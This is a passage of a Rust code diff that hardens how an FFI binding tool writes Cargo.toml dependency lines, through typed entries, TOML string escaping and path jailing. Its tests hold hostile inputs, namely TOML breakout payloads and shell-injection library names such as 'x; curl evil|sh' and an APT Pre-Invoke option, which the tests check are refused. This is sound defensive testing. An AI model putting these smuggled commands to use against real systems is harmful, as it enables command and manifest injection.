         define_types: iface.define_types,
         transparent_types: iface.transparent_types,
-        cargo_deps: cargo_dep_lines(pkg)?,
+        cargo_deps: cargo_deps(pkg, cache)?,
+        package_name: Some(pkg.name_pkg().clone()),
+        dep_idents,
         bindings: iface.bindings,
         wrapper_idents,
         dep_versions,
@@ -1410,16 +1651,193 @@ pub fn emit_coverage(
 
 // ── dynamic manifest lines ──────────────────────────────────────────────────
 
-/// The `[dependencies]` lines a program using this crate's bindings needs.
+/// One `[dependencies]` entry of the emitted app crate, typed.
+///
+/// Every bare value spliced into the rendered line is a decode-validated
+/// newtype whose charset gate excludes TOML metacharacters: the key is a
+/// [`PackageName`] (`[A-Za-z0-9_-]+`, alphabetic-first), the pin a
+/// [`CrateVersion`], and each feature a [`FeatureName`]. The wrapper path is a
+/// [`crate::pkginfo::JailedWrapperDir`] (proven inside the project root, its
+/// `Cargo.toml` naming the key) and is the one free-text value: it is rendered
+/// only through [`toml_basic_string`], which escapes every character a TOML
+/// basic string cannot hold raw. No `"`-and-newline payload can close a string
+/// and inject manifest content.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum CargoDep {
+    /// A registry crate pinned to one exact version.
+    Registry {
+        /// The dependency key.
+        name: PackageName,
+        /// The exact pinned version (never empty).
+        version: CrateVersion,
+        /// The enabled features, rendered in this order.
+        features: Vec<FeatureName>,
+    },
+    /// An author-supplied wrapper crate bound by `path`.
+    ///
+    /// The dependency key is the `[package] name` of the wrapper's own
+    /// `Cargo.toml`, carried by the jailed directory, so the key cargo resolves
+    /// and the crate it finds at the path cannot disagree.
+    Wrapper {
+        /// The wrapper directory, proven inside the project root.
+        dir: crate::pkginfo::JailedWrapperDir,
+        /// The enabled features, rendered in this order.
+        features: Vec<FeatureName>,
+    },
+}
+
+impl CargoDep {
+    /// The dependency key.
+    #[must_use]
+    pub const fn name(&self) -> &PackageName {
+        match self {
+            Self::Registry { name, .. } => name,
+            Self::Wrapper { dir, .. } => dir.package(),
+        }
+    }
+
+    /// The enabled features.
+    #[must_use]
+    pub const fn features(&self) -> &[FeatureName] {
+        match self {
+            Self::Registry { features, .. } | Self::Wrapper { features, .. } => features.as_slice(),
+        }
+    }
+
+    /// Render the `[dependencies]` line.
+    ///
+    /// The single renderer: a registry pin is `name = "=VER"` or
+    /// `name = { version = "=VER", features = ["a", "b"] }`; a wrapper is
+    /// `name = { path = "DIR" }` or `name = { path = "DIR", features = [...] }`.
+    #[must_use]
+    pub fn render(&self) -> String {
+        let quoted: Vec<String> = self
+            .features()
+            .iter()
+            .map(|f| format!("\"{}\"", f.as_str()))
+            .collect();
+        let name = self.name().as_str();
+        match (self, quoted.is_empty()) {
+            (Self::Registry { version, .. }, true) => {
+                format!("{name} = \"={}\"", version.as_str())
+            }
+            (Self::Registry { version, .. }, false) => format!(
+                "{name} = {{ version = \"={}\", features = [{}] }}",
+                version.as_str(),
+                quoted.join(", ")
+            ),
+            (Self::Wrapper { dir, .. }, true) => {
+                format!("{name} = {{ path = {} }}", toml_basic_string(dir.as_str()))
+            }
+            (Self::Wrapper { dir, .. }, false) => format!(
+                "{name} = {{ path = {}, features = [{}] }}",
+                toml_basic_string(dir.as_str()),
+                quoted.join(", ")
+            ),
+        }
+    }
+
+    /// Parse a legacy consumer manifest's stored dependency line.
+    ///
+    /// Only the exact registry-pin grammar [`CargoDep::render`] emits is
+    /// accepted: the parsed value must re-render to the input byte for byte.
+    /// A legacy manifest has no inspection document to re-derive a wrapper
+    /// crate's source from, so a `path` line has no proof it sits inside the
+    /// project and is refused with every other shape.
+    ///
+    /// # Errors
+    ///
+    /// [`crate::diag::WireDefect::LegacyDependencyLine`] for any line outside
+    /// the grammar, an empty version, or a key, version, or feature failing
+    /// its charset gate.
+    pub fn parse_registry_line(line: &str) -> Result<Self, crate::diag::WireDefect> {
+        let refuse = || crate::diag::WireDefect::LegacyDependencyLine {
+            got: line.to_owned(),
+        };
+        let (name, value) = line.split_once(" = ").ok_or_else(refuse)?;
+        let (version, features) = registry_value_parts(value).ok_or_else(refuse)?;
+        if version.is_empty() {
+            return Err(refuse());
+        }
+        let dep = Self::Registry {
+            name: PackageName::parse(name).map_err(|_| refuse())?,
+            version: CrateVersion::parse(version).map_err(|_| refuse())?,
+            features: features
+                .into_iter()
+                .map(|f| FeatureName::parse(f).map_err(|_| refuse()))
+                .collect::<Result<Vec<_>, _>>()?,
+        };
+        if dep.render() == line {
+            Ok(dep)
+        } else {
+            Err(refuse())
+        }
+    }
+}
+
+/// Render `text` as a TOML basic string, quotes included.
+///
+/// `"` and `\` are backslash-escaped, the named controls use their short
+/// escapes, and every other control character (C0, DEL, C1) is a `\uXXXX`
+/// escape, so the result parses back to exactly `text` whatever it holds.
+fn toml_basic_string(text: &str) -> String {
+    use std::fmt::Write as _;
+    let mut out = String::with_capacity(text.len().saturating_add(2));
+    out.push('"');
+    for c in text.chars() {
+        match c {
+            '"' => out.push_str("\\\""),
+            '\\' => out.push_str("\\\\"),
+            '\u{8}' => out.push_str("\\b"),
+            '\t' => out.push_str("\\t"),
+            '\n' => out.push_str("\\n"),
+            '\u{c}' => out.push_str("\\f"),
+            '\r' => out.push_str("\\r"),
+            c if c.is_control() => {
+                let _ = write!(out, "\\u{:04X}", u32::from(c));
+            }
+            c => out.push(c),
+        }
+    }
+    out.push('"');
+    out
+}
+
+/// Split a registry-pin value into its version text and quoted feature names.
+///
+/// `"=VER"` or `{ version = "=VER", features = ["a", "b"] }`; `None` for any
+/// other shape.
+fn registry_value_parts(value: &str) -> Option<(&str, Vec<&str>)> {
+    let bare = value
+        .strip_prefix("\"=")
+        .and_then(|rest| rest.strip_suffix('"'))
+        .map(|version| (version, Vec::new()));
+    bare.or_else(|| {
+        let body = value.strip_prefix("{ version = \"=")?.strip_suffix("] }")?;
+        let (version, features) = body.split_once("\", features = [")?;
+        let features = features
+            .split(", ")
+            .map(|f| f.strip_prefix('"')?.strip_suffix('"'))
+            .collect::<Option<Vec<_>>>()?;
+        Some((version, features))
+    })
+}
+
+/// The `[dependencies]` entries a program using this crate's bindings needs.
 ///
 /// One exact pinned version per resolved crate — never a guessed name,
-/// never `"*"` — with the effective feature set on the primary crate.
+/// never `"*"` — with the effective feature set on the primary crate. A
+/// wrapper crate is jailed to `cache`'s project root and bound by its
+/// [`crate::pkginfo::JailedWrapperDir`]. Registry pins are sorted by rendered
+/// line.
 ///
 /// # Errors
 ///
 /// A dep with no resolved version fails loudly (an unpinned line would be
-/// an under-bind waiting to happen).
-pub fn cargo_dep_lines(pkg: &PkgInfo) -> Result<Vec<String>, Diagnostic> {
+/// an under-bind waiting to happen); a wrapper crate that does not resolve
+/// inside the project root, or to a renderable directory, or whose
+/// `Cargo.toml` does not name the installed package, is refused.
+pub fn cargo_deps(pkg: &PkgInfo, cache: &FfiCache) -> Result<Vec<CargoDep>, Diagnostic> {
     let missing_version = |name: &str| Diagnostic::WireMalformed {
         context: format!("transitive dep `{name}`"),
         defect: crate::diag::WireDefect::Json {
@@ -1427,104 +1845,92 @@ pub fn cargo_dep_lines(pkg: &PkgInfo) -> Result<Vec<String>, Diagnostic> {
                 .to_owned(),
         },
     };
-    let mut lines = Vec::new();
-    // An author-supplied wrapper crate is bound by PATH, never a registry pin:
-    // the emitted app crate depends on the local wrapper directory. Its own
-    // transitive deps resolve through the wrapper's `Cargo.toml`, so the single
-    // path line is the whole dependency surface the app needs to add.
-    if !pkg.wrapper_path().is_empty() {
-        // The Cargo `[dependencies]` KEY is the charset-gated package NAME, never
-        // the weakly gated `pkg_path` (which may even be a `--manifest` filesystem
-        // path): the type forbids any ungated string reaching the TOML key.
-        lines.push(render_path_dep_line(
-            pkg.name_pkg(),
-            pkg.wrapper_path().as_str(),
-            pkg.features(),
-        ));
-        return Ok(lines);
-    }
-    if pkg.transitive_deps().is_empty() {
-        // No probe metadata: pin the primary crate from the package header. The
-        // dependency KEY is the charset-gated package name, never `pkg_path`.
-        if pkg.version().is_empty() {
-            return Err(missing_version(pkg.name()));
+    match pkg.source() {
+        // An author-supplied wrapper crate is bound by PATH, never a registry
+        // pin: the emitted app crate depends on the local wrapper directory. Its
+        // own transitive deps resolve through the wrapper's `Cargo.toml`, so the
+        // single path entry is the whole dependency surface the app needs to add.
+        crate::pkginfo::PkgSource::Wrapper(path) => {
+            let refuse = |defect| Diagnostic::WireMalformed {
+                context: format!("wrapper crate `{}`", pkg.name()),
+                defect,
+            };
+            let dir = path.jail(cache.project_root()?).map_err(refuse)?;
+            // The Cargo `[dependencies]` KEY is the wrapper's own
+            // `[package] name`, which must be the installed package's name: a
+            // wrapper edited after install to another name would otherwise bind
+            // bindings generated for one crate to a different one.
+            if dir.package() != pkg.name_pkg() {
+                return Err(refuse(crate::diag::WireDefect::WrapperManifest {
+                    got: path.as_str().to_owned(),
+                    defect: crate::diag::WrapperManifestDefect::PackageNameMismatch {
+                        expected: pkg.name().to_owned(),
+                        found: dir.package().as_str().to_owned(),
+                    },
+                }));
+            }
+            Ok(vec![CargoDep::Wrapper {
+                dir,
+                features: pkg.features().to_vec(),
+            }])
         }
-        lines.push(render_dep_line(
-            pkg.name_pkg(),
-            pkg.crate_version(),
-            pkg.features(),
-        ));
-        return Ok(lines);
-    }
-    for dep in pkg.transitive_deps() {
-        // The probe scaffold is dropped at the `PkgInfo` decode boundary, so
-        // every `TransitiveDep` reaching here is a real registry package.
-        if dep.version.is_empty() {
-            return Err(missing_version(dep.name.as_str()));
+        crate::pkginfo::PkgSource::Registry if pkg.transitive_deps().is_empty() => {
+            // No probe metadata: pin the primary crate from the package header.
+            // The dependency KEY is the charset-gated package name, never
+            // `pkg_path`.
+            if pkg.version().is_empty() {
+                return Err(missing_version(pkg.name()));
+            }
+            Ok(vec![CargoDep::Registry {
+                name: pkg.name_pkg().clone(),
+                version: pkg.crate_version().clone(),
+                features: pkg.features().to_vec(),
+            }])
         }
-        // The primary crate carries the effective feature set rustdoc
-        // succeeded with. Matched on the REGISTRY package NAME, not the lib
-        // ident: a crate whose lib renames its target (`async-stripe` → lib
-        // `stripe`) has `dep.ident = "stripe"` but `dep.name = "async-stripe"
-        // = pkg.name()`, and the `Cargo.toml` key is the package name — so
-        // matching on ident would drop the feature set and ship a manifest
-        // missing a mandatory runtime feature (a cargo build-script failure).
-        let features: &[FeatureName] = if dep.name.as_str() == pkg.name() {
-            pkg.features()
-        } else {
-            &[]
-        };
-        lines.push(render_dep_line(&dep.name, &dep.version, features));
+        crate::pkginfo::PkgSource::Registry => {
+            let mut deps = Vec::new();
+            for dep in pkg.transitive_deps() {
+                // The probe scaffold is dropped at the `PkgInfo` decode
+                // boundary, so every `TransitiveDep` reaching here is a real
+                // registry package.
+                if dep.version.is_empty() {
+                    return Err(missing_version(dep.name.as_str()));
+                }
+                // The primary crate carries the effective feature set rustdoc
+                // succeeded with. Matched on the REGISTRY package NAME, not the
+                // lib ident: a crate whose lib renames its target
+                // (`async-stripe` → lib `stripe`) has `dep.ident = "stripe"` but
+                // `dep.name = "async-stripe" = pkg.name()`, and the `Cargo.toml`
+                // key is the package name — so matching on ident would drop the
+                // feature set and ship a manifest missing a mandatory runtime
+                // feature (a cargo build-script failure).
+                let features = if dep.name.as_str() == pkg.name() {
+                    pkg.features().to_vec()
+                } else {
+                    Vec::new()
+                };
+                deps.push(CargoDep::Registry {
+                    name: dep.name.clone(),
+                    version: dep.version.clone(),
+                    features,
+                });
+            }
+            deps.sort_by_cached_key(CargoDep::render);
+            Ok(deps)
+        }
     }
-    lines.sort();
-    Ok(lines)
 }
 
-/// Render one pinned `[dependencies]` line. Every value spliced here is a
-/// decode-validated newtype whose charset gate excludes TOML metacharacters:
-/// `name` is a [`PackageName`] (`[A-Za-z0-9_-]+`, alphabetic-first), `version`
-/// a [`CrateVersion`], and each feature a [`FeatureName`]. A raw unchecked
-/// string cannot reach any of the three splice positions, so no
-/// `"`-and-newline payload can break out of its TOML string and inject manifest
-/// content — the types, not a runtime escape, close the injection class.
-fn render_dep_line(name: &PackageName, version: &CrateVersion, features: &[FeatureName]) -> String {
-    let name = name.as_str();
-    let version = version.as_str();
-    if features.is_empty() {
-        format!("{name} = \"={version}\"")
-    } else {
-        let quoted: Vec<String> = features
-            .iter()
-            .map(|f| format!("\"{}\"", f.as_str()))
-            .collect();
-        format!(
-            "{name} = {{ version = \"={version}\", features = [{}] }}",
-            quoted.join(", ")
-        )
-    }
-}
-
-/// Render a `path` `[dependencies]` line for an author-supplied wrapper crate.
+/// The rendered `[dependencies]` lines of [`cargo_deps`], in the same order.
 ///
-/// `path` is a [`crate::pkginfo::WrapperCratePath`], decode-gated to
-/// `[A-Za-z0-9._/-]` (plus space) so it carries no `"`-and-newline payload that
-/// could close its TOML string and inject manifest content; `name` and each
-/// feature are the same decode-validated newtypes `render_dep_line` splices, so
-/// no raw string reaches a TOML position.
-fn render_path_dep_line(name: &PackageName, path: &str, features: &[FeatureName]) -> String {
-    let name = name.as_str();
-    if features.is_empty() {
-        format!("{name} = {{ path = \"{path}\" }}")
-    } else {
-        let quoted: Vec<String> = features
-            .iter()
-            .map(|f| format!("\"{}\"", f.as_str()))
-            .collect();
-        format!(
-            "{name} = {{ path = \"{path}\", features = [{}] }}",
-            quoted.join(", ")
-        )
-    }
+/// # Errors
+///
+/// Exactly those of [`cargo_deps`].
+pub fn cargo_dep_lines(pkg: &PkgInfo, cache: &FfiCache) -> Result<Vec<String>, Diagnostic> {
+    Ok(cargo_deps(pkg, cache)?
+        .iter()
+        .map(CargoDep::render)
+        .collect())
 }
 
 // ── S4 sentinel DCE ─────────────────────────────────────────────────────────
@@ -1762,6 +2168,12 @@ mod tests {
 
     fn semver_pkg() -> PkgInfo {
         PkgInfo::decode_json(&semver_json()).expect("decodes")
+    }
+
+    /// A cache for registry-only rendering: never consulted for a jail, so
+    /// its project root need not exist.
+    fn registry_cache() -> FfiCache {
+        FfiCache::at_project_root(Path::new("/nonexistent-ipe-project"))
     }
 
     #[test]
@@ -2117,7 +2529,7 @@ mod tests {
 
     #[test]
     fn dep_lines_are_pinned_exact_with_primary_features() {
-        let lines = cargo_dep_lines(&semver_pkg()).expect("renders");
+        let lines = cargo_dep_lines(&semver_pkg(), &registry_cache()).expect("renders");
         assert_eq!(
             lines,
             vec![
@@ -2142,7 +2554,7 @@ mod tests {
             .to_string(),
         )
         .expect("decodes");
-        assert!(cargo_dep_lines(&pkg).is_err());
+        assert!(cargo_dep_lines(&pkg, &registry_cache()).is_err());
     }
 
     #[test]
@@ -2162,7 +2574,7 @@ mod tests {
         // not the weakly gated `pkg_path` — the underscore form is the crate's
         // own package name and a valid Cargo `[dependencies]` key.
         assert_eq!(
-            cargo_dep_lines(&pkg).expect("renders"),
+            cargo_dep_lines(&pkg, &registry_cache()).expect("renders"),
             vec!["serde_json = \"=1.0.145\""]
         );
     }
@@ -2188,7 +2600,7 @@ mod tests {
         )
         .expect("decodes");
         assert_eq!(
-            cargo_dep_lines(&pkg).expect("renders"),
+            cargo_dep_lines(&pkg, &registry_cache()).expect("renders"),
             vec!["handle-demo = \"=0.1.0\""]
         );
     }
@@ -2197,9 +2609,9 @@ mod tests {
     fn an_injection_bearing_version_never_reaches_a_manifest_line() {
         // An inspection whose resolved version carries a TOML-string-breakout
         // payload must be REFUSED at decode — the version can never reach
-        // `render_dep_line`, so no emitted `Cargo.toml` line can carry the
-        // injection. (The type-level guarantee: `render_dep_line` takes a
-        // `&CrateVersion`, and the only constructor is the decode-boundary
+        // `CargoDep::render`, so no emitted `Cargo.toml` line can carry the
+        // injection. (The type-level guarantee: `CargoDep` holds a
+        // `CrateVersion`, and the only constructor is the decode-boundary
         // parse, so an un-parsed string is unrepresentable at emission.)
         let evil = "1.0\", features=[\"net\"] }\n[dependencies.evil]\npath = \"/etc";
         let decoded = PkgInfo::decode_json(
@@ -2228,8 +2640,8 @@ mod tests {
     fn an_injection_bearing_feature_never_reaches_a_manifest_line() {
         // An inspection whose effective feature set carries a TOML-array
         // breakout payload must be REFUSED at decode — the feature can never
-        // reach `render_dep_line`, so no emitted `Cargo.toml` line can carry
-        // the injection. (`render_dep_line` takes `&[FeatureName]`, whose only
+        // reach `CargoDep::render`, so no emitted `Cargo.toml` line can carry
+        // the injection. (`CargoDep` holds `FeatureName`s, whose only
         // constructor is the decode-boundary parse.)
         let evil = "std\"]}\n[dependencies.evil]\npath = \"/tmp/evil\nx = [\"";
         let decoded = PkgInfo::decode_json(
@@ -2277,7 +2689,7 @@ mod tests {
             .to_string(),
         )
         .expect("a legal package name decodes even when pkg_path is hostile");
-        let lines = cargo_dep_lines(&pkg).expect("renders");
+        let lines = cargo_dep_lines(&pkg, &registry_cache()).expect("renders");
         assert_eq!(lines, vec!["semver = \"=1.0.145\""]);
         assert!(
             lines.iter().all(|l| !l.contains(evil_pkg)),
@@ -2302,7 +2714,7 @@ mod tests {
             .to_string(),
         )
         .expect("legal feature set decodes");
-        let lines = cargo_dep_lines(&pkg).expect("renders a manifest line");
+        let lines = cargo_dep_lines(&pkg, &registry_cache()).expect("renders a manifest line");
         assert_eq!(
             lines,
             ["tokio = { version = \"=1.0.0\", features = [\"rt-multi-thread\"] }"]
@@ -2356,8 +2768,11 @@ mod tests {
                 .to_owned(),
         ];
         let got = detect_missing_system_lib(&errors).expect("must detect");
-        assert_eq!(got.system_lib, "wayland-client");
-        assert_eq!(got.crate_name, "wayland-sys");
+        assert_eq!(got.system_lib.as_str(), "wayland-client");
+        assert_eq!(
+            got.crate_name.as_ref().map(CrateName::as_str),
+            Some("wayland-sys")
+        );
     }
 
     #[test]
@@ -2367,7 +2782,7 @@ mod tests {
             "Package 'wayland-client' was not found in the pkg-config search path.".to_owned(),
         ];
         let got = detect_missing_system_lib(&errors).expect("must detect");
-        assert_eq!(got.system_lib, "wayland-client");
+        assert_eq!(got.system_lib.as_str(), "wayland-client");
     }
 
     #[test]
@@ -2384,14 +2799,15 @@ mod tests {
 
     #[test]
     fn install_hint_for_returns_curated_hint_for_known_lib() {
-        let hint = install_hint_for("wayland-client");
+        let hint = install_hint_for(&SysLibName::parse("wayland-client").expect("legal name"));
         assert!(hint.contains("wayland"), "{hint}");
         assert!(hint.contains("apt"), "{hint}");
     }
 
     #[test]
     fn install_hint_for_returns_generic_fallback_for_unknown_lib() {
-        let hint = install_hint_for("some-obscure-lib-xyz");
+        let hint =
+            install_hint_for(&SysLibName::parse("some-obscure-lib-xyz").expect("legal name"));
         assert!(
             hint.contains("some-obscure-lib-xyz"),
             "fallback must mention the lib name: {hint}"
@@ -2489,7 +2905,7 @@ mod tests {
                 crate_name,
                 ..
             } => {
-                assert_eq!(system_lib, "wayland-client");
+                assert_eq!(system_lib.as_str(), "wayland-client");
                 assert_eq!(crate_name, "wayland-sys");
             }
             other => panic!("expected SystemLibraryNotFound, got {other:?}"),
@@ -2514,9 +2930,83 @@ mod tests {
             "The system library `way\u{1b}land` required by crate `wl\u{7f}sys` was not found."
                 .to_owned();
         let got = detect_missing_system_lib(&[line]).expect("signature matches");
-        assert_eq!(got.system_lib, "wayland");
-        assert_eq!(got.crate_name, "wlsys");
-        assert!(!got.system_lib.contains('\u{1b}'));
+        // `ESC l` is a two-byte escape sequence, dropped whole like every
+        // escape `TerminalSafe` strips.
+        assert_eq!(got.system_lib.as_str(), "wayand");
+        assert_eq!(
+            got.crate_name.as_ref().map(CrateName::as_str),
+            Some("wlsys")
+        );
+        assert!(!got.system_lib.as_str().contains('\u{1b}'));
+    }
+
+    /// A library name outside the `pkg-config` charset never reaches an install hint.
+    #[test]
+    fn a_hostile_system_lib_name_yields_no_install_hint() {
+        let over_length = "a".repeat(SYS_LIB_NAME_MAX_LEN + 1);
+        let hostile = [
+            "x; curl evil|sh",
+            "$(id)",
+            "`id`",
+            "lib foo",
+            "-o APT::Update::Pre-Invoke::=id",
+            over_length.as_str(),
+        ];
+        for name in hostile {
+            assert_eq!(SysLibName::parse(name), None, "{name:?} parsed");
+            let primary =
+                format!("The system library `{name}` required by crate `evil-sys` was not found.");
+            assert_eq!(
+                detect_missing_system_lib(&[primary]),
+                None,
+                "{name:?} detected"
+            );
+            let secondary =
+                format!("Package '{name}' was not found in the pkg-config search path.");
+            assert_eq!(
+                detect_missing_system_lib(&[secondary]),
+                None,
+                "{name:?} detected"
+            );
+        }
+        let longest = "a".repeat(SYS_LIB_NAME_MAX_LEN);
+        assert!(
+            SysLibName::parse(&longest).is_some(),
+            "the bound itself is legal"
+        );
+        assert!(SysLibName::parse("gtk+-3.0").is_some());
+        assert!(SysLibName::parse("libpipewire-0.3").is_some());
+    }
+
+    /// A hostile library name surfaces as the summarised inspector failure, never as a hint.
+    #[test]
+    fn install_from_inspection_gives_no_hint_for_a_hostile_system_lib() {
+        let json = serde_json::json!({
+            "pkg": "evil",
+            "name": "evil",
+            "version": "0.1.0",
+            "functions": [],
+            "errors": [
+                "The system library `x; curl evil|sh` required by crate `evil-sys` was not found."
+            ]
+        })
+        .to_string();
+        let tmp =
+            std::env::temp_dir().join(format!("ipe-ffi-syslib-hostile-{}", std::process::id()));
+        let cache = FfiCache::at_project_root(&tmp);
+        let err = install_from_inspection(&cache, &json).expect_err("must fail");
+        assert!(
+            matches!(err, crate::diag::Diagnostic::WireMalformed { .. }),
+            "expected a summarised failure, got {err:?}"
+        );
+    }
+
+    /// A crate name that does not parse falls back to the inspected package's name.
+    #[test]
+    fn a_hostile_crate_name_falls_back_to_the_package_name() {
+        let line = "The system library `zlib` required by crate `a b;c` was not found.".to_owned();
+        let got = detect_missing_system_lib(&[line]).expect("library parses");
+        assert_eq!(got.crate_name, None);
     }
 
     #[test]
@@ -2637,5 +3127,693 @@ mod tests {
             "an absent opaqueTypeIds field yields an empty map"
         );
         let _ = std::fs::remove_dir_all(&cache_root);
+    }
+
+    /// A minimal wrapper-crate inspection bound at `wrapper_path`.
+    fn wrapper_pkg(wrapper_path: &str) -> Result<PkgInfo, Diagnostic> {
+        PkgInfo::decode_json(
+            &json!({
+                "pkg": "engine_wrap",
+                "name": "engine_wrap",
+                "version": "0.1.0",
+                "wrapperPath": wrapper_path,
+                "functions": [],
+                "errors": []
+            })
+            .to_string(),
+        )
+    }
+
+    /// The `Cargo.toml` of the scratch `engine_wrap` wrapper crate.
+    const ENGINE_MANIFEST: &str = "[package]\nname = \"engine_wrap\"\nversion = \"0.1.0\"\n";
+
+    /// A scratch project root holding the `engine_wrap` crate at
+    /// `wrappers/engine`, plus the canonical form of that wrapper directory.
+    fn scratch_project(test_name: &str) -> (PathBuf, PathBuf) {
+        let project =
+            std::env::temp_dir().join(format!("ipe-ffi-jail-{test_name}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&project);
+        std::fs::create_dir_all(project.join("wrappers/engine")).expect("scratch wrapper dir");
+        std::fs::write(project.join("wrappers/engine/Cargo.toml"), ENGINE_MANIFEST)
+            .expect("scratch wrapper manifest");
+        let canonical =
+            std::fs::canonicalize(project.join("wrappers/engine")).expect("canonicalizes");
+        (project, canonical)
+    }
+
+    /// The `path` value of a rendered wrapper line, read back by a TOML parser.
+    fn parsed_path(line: &str) -> Option<String> {
+        let table: toml::Table = toml::from_str(line).ok()?;
+        table
+            .get("engine_wrap")?
+            .get("path")?
+            .as_str()
+            .map(str::to_owned)
+    }
+
+    /// The manifest defect a wrapper load was refused with, if any.
+    fn manifest_defect<T>(
+        r: &Result<T, Diagnostic>,
+    ) -> Option<&crate::diag::WrapperManifestDefect> {
+        let Some(crate::diag::WireDefect::WrapperManifest { defect, .. }) = jail_defect(r) else {
+            return None;
+        };
+        Some(defect)
+    }
+
+    /// Load the scratch wrapper after replacing its `Cargo.toml` with `manifest`.
+    fn load_with_manifest(test_name: &str, manifest: &[u8]) -> Result<Vec<CargoDep>, Diagnostic> {
+        let (project, canonical) = scratch_project(test_name);
+        std::fs::write(canonical.join("Cargo.toml"), manifest).expect("scratch manifest");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let r = cargo_deps(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        r
+    }
+
+    fn jail_defect<T>(r: &Result<T, Diagnostic>) -> Option<&crate::diag::WireDefect> {
+        let Err(Diagnostic::WireMalformed { defect, .. }) = r else {
+            return None;
+        };
+        Some(defect)
+    }
+
+    #[test]
+    fn empty_wrapper_path_decodes_as_registry_source() {
+        let pkg = semver_pkg();
+        assert_eq!(pkg.source(), &crate::pkginfo::PkgSource::Registry);
+        let wrapped = wrapper_pkg("wrappers/engine").expect("decodes");
+        assert!(matches!(
+            wrapped.source(),
+            crate::pkginfo::PkgSource::Wrapper(p) if p.as_str() == "wrappers/engine"
+        ));
+    }
+
+    #[test]
+    fn wrapper_path_with_parent_segment_is_refused_at_decode() {
+        for got in ["../outside", "wrappers/../../outside", "wrappers/.."] {
+            let r = wrapper_pkg(got);
+            assert!(
+                matches!(
+                    r,
+                    Err(Diagnostic::WireMalformed {
+                        defect: crate::diag::WireDefect::WrapperPathTraversal { .. },
+                        ..
+                    })
+                ),
+                "`{got}` must be refused as traversal: {r:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn relative_wrapper_path_inside_the_root_renders_canonical() {
+        let (project, canonical) = scratch_project("rel-ok");
+        let text = canonical.to_str().expect("utf-8 temp path");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let deps = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        let deps = deps.expect("jails inside the root");
+        assert_eq!(
+            deps,
+            [format!(
+                "engine_wrap = {{ path = {} }}",
+                toml_basic_string(text)
+            )]
+        );
+        assert_eq!(
+            deps.first().and_then(|line| parsed_path(line)).as_deref(),
+            Some(text)
+        );
+    }
+
+    #[test]
+    fn absolute_wrapper_path_inside_the_root_is_accepted() {
+        let (project, canonical) = scratch_project("abs-ok");
+        let text = canonical.to_str().expect("utf-8 temp path").to_owned();
+        let pkg = wrapper_pkg(&text).expect("decodes");
+        let deps = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        assert_eq!(
+            deps.expect("jails inside the root"),
+            [format!(
+                "engine_wrap = {{ path = {} }}",
+                toml_basic_string(&text)
+            )]
+        );
+    }
+
+    #[test]
+    fn absolute_wrapper_path_outside_the_root_is_refused() {
+        let (project, _) = scratch_project("abs-out");
+        let (elsewhere, outside) = scratch_project("abs-out-elsewhere");
+        let pkg = wrapper_pkg(outside.to_str().expect("utf-8 temp path")).expect("decodes");
+        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        let _ = std::fs::remove_dir_all(&elsewhere);
+        assert!(
+            matches!(
+                jail_defect(&r),
+                Some(crate::diag::WireDefect::WrapperPathOutsideRoot { .. })
+            ),
+            "{r:?}"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn symlinked_wrapper_dir_escaping_the_root_is_refused() {
+        let (project, _) = scratch_project("symlink");
+        let (elsewhere, outside) = scratch_project("symlink-elsewhere");
+        std::os::unix::fs::symlink(&outside, project.join("wrappers/link")).expect("symlink");
+        let pkg = wrapper_pkg("wrappers/link").expect("decodes");
+        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        let _ = std::fs::remove_dir_all(&elsewhere);
+        assert!(
+            matches!(
+                jail_defect(&r),
+                Some(crate::diag::WireDefect::WrapperPathOutsideRoot { .. })
+            ),
+            "{r:?}"
+        );
+    }
+
+    #[test]
+    fn missing_wrapper_dir_is_refused() {
+        let (project, _) = scratch_project("missing");
+        let pkg = wrapper_pkg("wrappers/gone").expect("decodes");
+        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        assert!(
+            matches!(
+                jail_defect(&r),
+                Some(crate::diag::WireDefect::WrapperPathUnresolvable { .. })
+            ),
+            "{r:?}"
+        );
+    }
+
+    #[test]
+    fn wrapper_path_naming_a_file_is_refused() {
+        let (project, _) = scratch_project("file");
+        std::fs::write(project.join("wrappers/engine/lib.rs"), "").expect("scratch file");
+        let pkg = wrapper_pkg("wrappers/engine/lib.rs").expect("decodes");
+        let r = cargo_dep_lines(&pkg, &FfiCache::at_project_root(&project));
+        let _ = std::fs::remove_dir_all(&project);
+        assert!(
+            matches!(
+                jail_defect(&r),
+                Some(crate::diag::WireDefect::WrapperPathUnresolvable { .. })
+            ),
+            "{r:?}"
+        );
+    }
+
+    #[test]
+    fn unanchored_cache_root_refuses_to_jail() {
+        let (project, _) = scratch_project("unanchored");
+        let pkg = wrapper_pkg("wrappers/engine").expect("decodes");
+        let cache = FfiCache {
+            root: project.clone(),
+        };
+        let r = cargo_dep_lines(&pkg, &cache);
+        let _ = std::fs::remove_dir_all(&project);
+        assert!(
+            matches!(
+                jail_defect(&r),
+                Some(crate::diag::WireDefect::CacheRootUnanchored { .. })
+            ),
+            "{r:?}"
+        );
+    }
+
+    #[test]
+    fn cache_project_root_strips_the_cache_suffix() {
+        let cache = FfiCache::at_project_root(Path::new("/srv/app"));
+        assert_eq!(cache.project_root().ok(), Some(Path::new("/srv/app")));
+        let here = FfiCache::at_project_root(Path::new(""));
+        assert_eq!(here.project_root().ok(), Some(Path::new(".")));
+    }
+
+    /// A legacy consumer manifest carrying `cargo_deps` as its dependency list.
+    fn legacy_consumer_with_deps(cargo_deps: &serde_json::Value) -> String {
+        json!({
+            "moduleName": "Rust.Semver",
+            "kernelName": "Rust_Semver",
+            "opaqueTypes": { "Version": "::semver::Version" },
+            "defineTypes": [],
+            "cargoDeps": cargo_deps,
+            "bindings": []
+        })
+        .to_string()
+    }
+
